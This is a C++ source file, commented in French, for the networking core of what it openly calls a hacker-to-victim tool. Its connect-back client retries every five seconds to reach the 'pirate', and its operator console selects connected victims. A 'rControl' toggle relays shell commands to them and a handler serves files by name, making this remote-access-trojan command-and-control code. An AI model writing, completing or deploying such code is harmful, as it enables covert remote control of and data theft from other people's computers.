//
// Created by Berlingot on 2023-04-20.
//

#include "Connexion.h"

Connexion* Connexion::connexionptrreference;

Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {// premiere connection pour voir les information de la cible
    switch (ConnexionTypearg) {
        case ConnexionType::INBOUND:
            INBOUNDconnexion(adresseIP,port);
            break;
        case ConnexionType::OUTBOUND:
            OUTBOUNDconnexion(adresseIP,port);
            break;
        default:break;
    }
}

void Connexion::INBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){

        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (_socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (_socket.AcceptConnection(_socket) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;
                    connexionptrreference = this;
                    this->adresseIP.sin_addr.s_addr = inet_addr("127.0.0.1"); //Broadcast locally
                    this->adresseIP.sin_port = htons(13337); //Port
                    this->adresseIP.sin_family = AF_INET; //IPv4 Socket
                    listenning();
                    }
                }
        }
    }
}

void Connexion::OUTBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){
        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            std::cout << std::endl<< "Tentative de connexion au pirate"<<std::endl;
            while(pirateTrouvee == false) {
                if (_socket.ConnectTo(MyPNet::IPEndpoint(adresseIP, port)) == MyPNet::PResult::P_Success) {
                    pirateTrouvee = true;
                    std::cout << "Connexion établie" << std::endl;
                    return;
                } else { std::cout << std::endl << "Tentative de connexion échoué." << std::endl << "Nouvelle tentative dans 5 secondes" << std::endl; sleep(5);}
            }
        }
    }
}

bool Connexion::listenning() {

    listenersocket = socket(AF_INET, SOCK_STREAM, NULL);
    int result;
    result = bind(listenersocket, (SOCKADDR*)&adresseIP, sizeof(adresseIP));
    if(result){ // il y a erreur lors du bind
        std::cerr << std::to_string(WSAGetLastError());
        exit(1);
    }
    result = listen(listenersocket, SOMAXCONN);
    if (result) { // Echeck de l'écoute du socket
        std::cerr << std::to_string(WSAGetLastError());
        exit(1);
    }
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)TransmitionDePaquetThread, NULL, NULL, NULL); // si tout fonctionne, on lance un nouveua thread pour la transmition des paquets
    return false;
} //https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/beginthread-beginthreadex?view=msvc-170

void Connexion::TransmitionDePaquetThread() {
    while (true){
        for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++){
            if (connexionptrreference->activeconnection[i]->gestionpacket.PacketEnAttente()){
                MyPNet::Packet p = connexionptrreference->activeconnection[i]->gestionpacket.Retrieve(); //todo rendu icite mon paquest scrap?
                p.read_back();
                if (!connexionptrreference->sendallpack(i, p.bufferL, p.size)){
                    std::cerr << "erreur lors de l'envoie du packet: " << i << std::endl;
                }
                delete p.bufferL; //efface le buffer
            }
        }
        Sleep(5);
    }
}

bool Connexion::sendallpack(int ID, char *data, int totalbytes) {

    int bytesenvoyee = 0; //incremente pour chaque paquet envoyee
    while (bytesenvoyee < totalbytes){ //tant qu'il reste de packets

        int RetnCheck = send(activeconnection[ID]->socket, data + bytesenvoyee, totalbytes - bytesenvoyee, NULL); //envoie de bytes
        if (RetnCheck == SOCKET_ERROR) { //
            std::cerr << "Erreur lors de l'envoie" << std::endl;
            return false; //echec d'envoie
        }
        bytesenvoyee += RetnCheck;
    } return true; //Réussi
}

void Connexion::ListenForNewConnection() {
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)EcouteThread, NULL, NULL, NULL); // thread qui ecoute pour toute nouvelle connexion
}

void Connexion::EcouteThread() {
    while (true){
        SOCKET newConnectionSocket = accept(connexionptrreference->listenersocket, (SOCKADDR*)&connexionptrreference->adresseIP, &connexionptrreference->addresselen); //Accepter connection
        if (newConnectionSocket == 0)        {
            std::cerr << "Connexion n'a pas pu être accepter " << std::endl;
        }else {
            std::lock_guard<std::mutex> lock(connexionptrreference->connectionMgr_mutex); //manipulation de la pile des packet, lock la pile pendant sont utilisation MUTEX
            int NewConnectionID = connexionptrreference->activeconnection.size(); //gestion des connexions quelle session est connecté/manipulé
            if (connexionptrreference->UnusedConnections > 0){
                for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++){
                    if (connexionptrreference->activeconnection[i]->ActiveConnection == false){

                        connexionptrreference->activeconnection[i]->socket = newConnectionSocket;
                        connexionptrreference->activeconnection[i]->ActiveConnection = true;
                        NewConnectionID = i;
                        connexionptrreference->UnusedConnections -= 1;
                        break;
                    }
                }
            }else{
                std::shared_ptr<ActiveConnexionVerification> newConnection(new ActiveConnexionVerification(newConnectionSocket));
                connexionptrreference->activeconnection.push_back(newConnection);
            }
            _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ConnexionHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
        }
    }
}

void Connexion::ConnexionHandlerThread(int ID) {
    MyPNet::PacketType packettype;
    while (true)
    {
        if (!connexionptrreference->GetPacketType(ID, packettype)) {
            break; }
        if (!connexionptrreference->ProcessPacket(ID, packettype)) {
            break; }
    }
    //erreur/connexion perdu
    connexionptrreference->DisconnectClient(ID);
    return;
}

bool Connexion::GetPacketType(int ID, MyPNet::PacketType &_packettype) {
    int packettype;
    if (!Getint32_t(ID, packettype)) {
        return false; }
    _packettype = (MyPNet::PacketType)packettype;
    return true;
}

bool Connexion::Sendint32_t(int ID, int32_t _int32_t) {
    _int32_t = htonl(_int32_t);
    if (sendallpack(ID, (char*)&_int32_t, sizeof(int32_t)) == false) {
        return false; }
    return true;
    }




bool Connexion::Getint32_t(int ID, int32_t &_int32_t) {
    if (recvallpack(ID, (char*)&_int32_t, sizeof(int32_t)) ==  false){
        return false; }
    _int32_t = ntohl(_int32_t);
    return true;
}

bool Connexion::recvallpack(int ID, char *data, int totalbytes) {
    int bytesreceived = 0;
    while (bytesreceived < totalbytes){
        int RetnCheck = recv(activeconnection[ID]->socket, data, totalbytes - bytesreceived, NULL);
        if (RetnCheck == SOCKET_ERROR) {
            return false; }
        bytesreceived += RetnCheck;
    }
    return true;
}

void Connexion::DisconnectClient(int ID) {
    currentSessionID = -1;
    std::lock_guard<std::mutex> lock(connectionMgr_mutex);
    if (activeconnection[ID]->ActiveConnection == false){
        return;
    }
    activeconnection[ID]->gestionpacket.Clear();
    activeconnection[ID]->ActiveConnection = false;
    closesocket(activeconnection[ID]->socket);
    if (ID == (activeconnection.size() - 1)){
        activeconnection.pop_back();
        for (size_t i = activeconnection.size() - 1; i >= 0 && activeconnection.size() > 0; i--){
            if (activeconnection[i]->ActiveConnection){
                break;
            }
            activeconnection.pop_back();
            UnusedConnections -= 1;
        }
    }else{
        UnusedConnections += 1;
    }
}

bool Connexion::ProcessPacket(int ID, MyPNet::PacketType _packettype) {
    switch (_packettype)
    {

        case MyPNet::PacketType::Instruction:
        {
            std::string message;
            if (false == GetString(ID, message))
                return false;
            General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 1);
            break;
        }

        case MyPNet::PacketType::CMDCommand:
        {
            std::string message;
            if (false == GetString(ID, message))
                return false;

            General::outputMsg(message, 3);

            break;
        }

        case MyPNet::PacketType::Warning:
        {
            std::string message;
            if (false == GetString(ID, message))
                return false;
            General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 2);
            break;
        }

        case MyPNet::PacketType::FileTransferRequestFile:
        {
            std::string FileName; //string to store file name
            if (GetString(ID, FileName) ==  false ){
                return false;
            }
            activeconnection[ID]->fichier.infileStream.open(FileName, std::ios::binary | std::ios::ate);
            if (activeconnection[ID]->fichier.infileStream.is_open() == false){
                return true;
            }

            activeconnection[ID]->fichier.fileName = FileName;
            activeconnection[ID]->fichier.fileSize = activeconnection[ID]->fichier.infileStream.tellg();
            activeconnection[ID]->fichier.infileStream.seekg(0);
            activeconnection[ID]->fichier.fileOffset = 0;
            if (!HandleSendFile(ID))
                return false;
            break;
        }
        case MyPNet::PacketType::FileTransferRequestNextBuffer:
        {
            if (!HandleSendFile(ID)) {
                return false;
            }
            break;
        }
        default:
        {
            break;
        }
    }
    return true;
}

bool Connexion::GetString(int ID, std::string &_string) {
    int32_t bufferlength;
    if (Getint32_t(ID, bufferlength)==false) {
        return false;
    }
    char * buffer = new char[bufferlength + 1];
    buffer[bufferlength] = '\0';
    if (recvallpack(ID, buffer, bufferlength) == false){
        delete[] buffer;
        return false;
    }
    _string = buffer;
    delete[] buffer;
    return true;
}

bool Connexion::HandleSendFile(int ID) {

    if (activeconnection[ID]->fichier.fileOffset >= activeconnection[ID]->fichier.fileSize){
        return true;
    }
    if (SendPacketType(ID, MyPNet::PacketType::FileTransferByteBuffer) == false ){
        return false;
    }

    activeconnection[ID]->fichier.remainingBytes = activeconnection[ID]->fichier.fileSize - activeconnection[ID]->fichier.fileOffset;
    if (activeconnection[ID]->fichier.remainingBytes > activeconnection[ID]->fichier.buffersize)  {
        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize);
        if (Sendint32_t(ID, activeconnection[ID]->fichier.buffersize) ==  false){
            return false;
        }
        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize)){
            return false;
        }
        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.buffersize;
    }
    else
    {
        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes);
        if (!Sendint32_t(ID, activeconnection[ID]->fichier.remainingBytes)) {
            return false;
        }
        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes)) {
            return false;
        }
        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.remainingBytes;
    }

    if (activeconnection[ID]->fichier.fileOffset == activeconnection[ID]->fichier.fileSize){
        if (!SendPacketType(ID, MyPNet::PacketType::FileTransfer_EndOfFile)) {
            return false;
        }
    }
    return true;
}

bool Connexion::SendPacketType(int ID, MyPNet::PacketType _packettype) {
    if (!Sendint32_t(ID, _packettype))
        return false;
    return true;
    }

void Connexion::HandleInput() {

    std::string userinput;
    int inputInt;
    currentSessionID = -1;
    while (true){
        std::getline(std::cin, userinput);
        if (currentSessionID == -1){
            if (General::processParameter(userinput, "connect")) {
                inputInt = atoi(userinput.c_str());
                int tempInt = activeconnection.size() - 1;
                if (inputInt > tempInt){
                    General::outputMsg("pas de session", 2);
                }else{
                    currentSessionID = inputInt;
                    General::outputMsg("session connectee " + std::to_string(currentSessionID), 1);
                }
                inputInt = 0;
                userinput.empty();
            }
            else if (General::processParameter(userinput, "listeClients")){
                //(TODO: list clients)
            }
        } else {
            if (userinput == "exit"){
                currentSessionID = -1;
            }
            else if (userinput.find("rControl") != std::string::npos){
                General::cmdMode = !General::cmdMode;
                std::cout << currentSessionID << userinput;
                SendString(currentSessionID, userinput, MyPNet::PacketType::Instruction);
            }
            else if (General::cmdMode){
                SendString(currentSessionID, userinput, MyPNet::PacketType::CMDCommand);
            }else{
                SendString(currentSessionID, userinput, MyPNet::PacketType::Instruction);
            }
        }
    }
}

void Connexion::SendString(int ID, std::basic_string<char> _string, MyPNet::PacketType _packettype) {//todo check la conversion de string en basic string
    MyPNet::Message message(_string);
    if (ID == -2){
        for (int i = 0; i < activeconnection.size(); i++){
            activeconnection[i]->gestionpacket.Append(message.toPacket(_packettype));
        }
    }else{
        activeconnection[ID]->gestionpacket.Append(message.toPacket(_packettype));
    }
}